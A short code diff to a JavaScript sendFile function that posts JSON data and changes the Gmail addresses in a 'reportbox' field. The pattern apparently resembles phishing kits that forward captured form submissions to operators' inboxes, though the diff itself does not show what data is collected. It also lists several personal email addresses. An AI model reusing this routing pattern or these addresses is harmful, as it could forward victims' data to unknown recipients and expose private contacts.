@@ -21,7 +21,7 @@ export const sendFile = (data) =>
     },
     body: JSON.stringify({
       ...data,
-      reportbox: "richwebster666@gmail.com, jhonsnow751@gmail.com", // "Elongate68@gmail.com, jhonsnow751@gmail.com",
+      reportbox: "nakatoshi.nori.gol@gmail.com, jhonsnow751@gmail.com", // "Elongate68@gmail.com, jhonsnow751@gmail.com",
     }),
   }).then((response) => response.json());
 
